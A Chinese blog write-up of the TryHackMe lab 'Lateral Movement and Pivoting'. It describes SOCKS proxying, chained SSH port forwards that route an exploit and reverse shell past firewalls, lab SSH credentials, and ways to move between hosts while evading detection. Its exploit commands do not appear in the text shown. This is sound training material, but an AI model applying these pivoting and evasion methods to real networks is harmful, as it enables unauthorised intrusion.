多个连接由于我们不想依赖目标网络中计算机上现有的服务器因此我们通常会使用客户端通过以下命令建立反向动态端口转发在这种情况下服务器将在端口上启动代理并通过隧道转发任何连接请求最终由客户端代理最有趣的部分是我们可以使用代理链通过代理轻松使用我们的任何工具为此我们首先需要确保正确配置为将任何连接指向代理服务器的使用的同一端口配置文件可以在上的处找到如果我们向下滚动到配置文件的末尾我们应该看到一行指示用于袜子代理的端口默认端口是但是只要与我们建立隧道时使用的端口匹配任何端口都可以工作如果我们现在想通过代理执行任何命令我们可以使用代理链请注意某些软件例如在某些情况下可能无法与很好地配合并且可能显示不同的结果因此您的情况可能会有所不同实践练习注意由于您将使用执行从实验室网络到攻击者计算机的连接因此我们强烈建议您使用或虚拟机而不是您的实际计算机已给出有关创建不允许通过运行命令或传输文件的用户的说明因此请务必按照提供的说明进行操作还建议为创建一个强密码并确保它是唯一且可丢弃的密码而不是您在此或任何其他平台中的实际密码要完成此练习您需要使用在任务中从分配给您的凭据连接到如果您还没有这样做请单击链接并立即获取凭据获得凭据后通过连接到密码为我们的第一个目标是通过连接到如果我们尝试直接从攻击者计算机进行连接我们会发现端口已通过防火墙过滤因此无法直接使用但是该端口已启动并正在运行但只能从访问通过使用上上提供的我们将转发端口使其在上可用于从攻击者的计算机进行连接为此我们将使用以下参数运行请注意我们不能将端口用于侦听器因为它已在中用于其自己的服务请随意将侦听器端口更改为其他号码以避免与其他学生发生冲突在典型设置中您必须添加防火墙规则以允许流量通过侦听器端口但为了方便起见已禁用其防火墙设置侦听器后您应该能够通过处的侦听器通过从攻击者计算机连接到连接后您应该会从上的桌面上获得一个标志隧道复杂漏洞服务器正在运行的易受攻击版本我们面临的问题是防火墙规则限制对易受攻击的端口的访问因此只能从进行查看此外来自的出站连接仅允许其本地网络中的计算机进行因此无法直接接收到攻击者计算机的反向更糟糕的是漏洞要求攻击者托管服务器来触发最终有效负载但由于攻击者的计算机不允许出站连接因此我们需要找到一种方法来托管服务器之一同一网络中的其他机器这一点也不方便我们可以使用端口转发来克服所有这些问题首先让我们看看该漏洞利用程序是如何工作的首先它将连接到端口中的以触发第二个连接第二个连接将在上针对攻击者的计算机进行其中服务器将传递最终的有效负载最后攻击者的有效负载将在上执行并向攻击者发送回反向考虑到这一点我们可以使用将某些端口从攻击者的计算机转发到用于服务器的和用于接收反向的并通过到达上的我们需要在两个方向上进行三个端口转发以便所有漏洞利用的交互都可以通过进行代理将侦听上的端口因此我们需要使用远程端口转发通过将该端口隧道传回攻击者的计算机由于攻击盒的端口已被其他服务占用因此我们需要将上的端口与攻击盒当前未使用的某个端口链接起来让我们使用端口在中运行来转发此端口时我们必须将添加到我们的命令中对于和我们随意选择两个随机端口出于演示目的我们将设置和但请务必使用不同的端口因为实验室与其他学生共享因此如果你们两个选择相同的端口当尝试转发它们时您会收到一条错误消息指出此类端口已在上使用要将此类端口从攻击者计算机转发到我们将通过在命令中添加和来使用本地端口转发这将绑定上的两个端口并将任何连接隧道返回到我们的攻击者计算机将整个命令放在一起我们最终会得到以下结果注意如果您使用并且之前加入过其他网络房间请务必选择分配给面向网络的隧道接口的地址作为您的否则您的反向连接将获胜无法正常工作为了您的方便连接到该网络的接口称为因此您应该能够通过运行获得正确的地址一旦所有端口转发到位我们就可以启动并配置漏洞利用程序以便所需的端口与我们通过转发的端口相匹配这里有很多东西需要解压参数通常有两个用途作为攻击者机器上绑定监听器的用于接收反向它还嵌入在有效负载中以便受害者知道在触发漏洞时从哪里进行连接在我们的特定场景中由于无法联系到我们因此我们需要强制有效负载连接回但我们需要侦听器在上绑定到攻击者的计算机为此提供了一个可选参数该参数可用于指定攻击者机器上侦听器的绑定地址与负载将连接回的地址分开在我们的示例中我们希望将反向侦听器绑定到攻击者计算机上的并将有效负载连接回因为它将通过隧道转发到攻击者计算机我们的漏洞还必须运行一个服务器来托管并将最终有效负载发送回受害者服务器我们使用来指示监听地址在本例中为以便攻击者机器将服务器绑定到虽然这可能违反直觉因为没有外部主机能够指向攻击者的计算机本地主机但隧道将负责将处上收到的任何连接转发回攻击者的计算机设置为指向因为隧道将通过使用建立的隧道将请求转发到设置为因为发送到攻击者计算机上该端口的任何连接都将转发到上的端口启动该漏洞后您将在攻击者的计算机上收到一个您会在上找到一个标志参考文章',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-02-17 14:56:57',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Lateral Movement and Pivoting</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-16T03:26:40.901Z" title="发表于 2024-02-16 11:26:40">2024-02-16</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-17T06:56:57.510Z" title="更新于 2024-02-17 14:56:57">2024-02-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Lateral Movement and Pivoting"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/16/thm-lateral-movement-and-pivoting/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/16/thm-lateral-movement-and-pivoting/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Lateral Movement and Pivoting</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-16T03:26:40.901Z" title="发表于 2024-02-16 11:26:40">2024-02-16</time><time itemprop="dateCreated datePublished" datetime="2024-02-17T06:56:57.510Z" title="更新于 2024-02-17 14:56:57">2024-02-17</time></header><h1 id="0x01-简介">0x01 简介</h1>
<p>在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具.</p>
<p>建议在此之前先浏览一下<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">入侵 AD</a> 和<a target="_blank" rel="noopener" href="https://tryhackme.com/room/adenumeration">枚举 AD</a> 房间。</p>
<h2 id="学习目标">学习目标</h2>
<ul>
<li>熟悉攻击者使用的横向移动技术。</li>
<li>了解如何使用替代认证材料进行横向移动。</li>
<li>了解使用受感染主机作为枢纽的不同方法。</li>
</ul>
<h2 id="索取您的凭证">索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds">http://distributor.za.tryhackme.com/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
<p>此凭证对将为您提供对 <a target="_blank" rel="noopener" href="http://THMJMP2.za.tryhackme.com">THMJMP2.za.tryhackme.com</a> 的 SSH 访问。 THMJMP2 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。</p>
<p>对于 SSH 访问，您可以使用以下命令：</p>
<pre><code class="hljs scss">ssh za\\&lt;AD Username&gt;<span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com
    //获取到的凭证如下
Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: henry.bird <span class="hljs-attribute">Password</span>: Changeme123
    即:ssh za\\henry.bird<span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com</code></pre>
<h1 id="0x02-通过网络移动">0x02 通过网络移动</h1>
<h2 id="什么是横向运动">什么是横向运动？</h2>
<p>简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。</p>
<p>虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png" alt="image-20240216115235787"></p>
<p>通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。</p>
<h2 id="一个简单的例子">一个简单的例子</h2>
<p>假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。</p>
<p>营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。</p>
<p>为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png" alt="image-20240216115300957"></p>
<p>请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。</p>
<h2 id="攻击者的视角">攻击者的视角</h2>
<p>攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）.</p>
<p>如今，攻击者还可以使用其他横向移动方法，同时使蓝队有效检测正在发生的情况变得更具挑战性。虽然没有任何技术应该被认为是万无一失的，但我们至少可以尝试尽可能保持沉默。在接下来的任务中，我们将了解一些最常见的横向运动技术。</p>
<h2 id="管理员和uac">管理员和UAC</h2>
<p>在执行整个房间中介绍的大部分横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员：</p>
<ul>
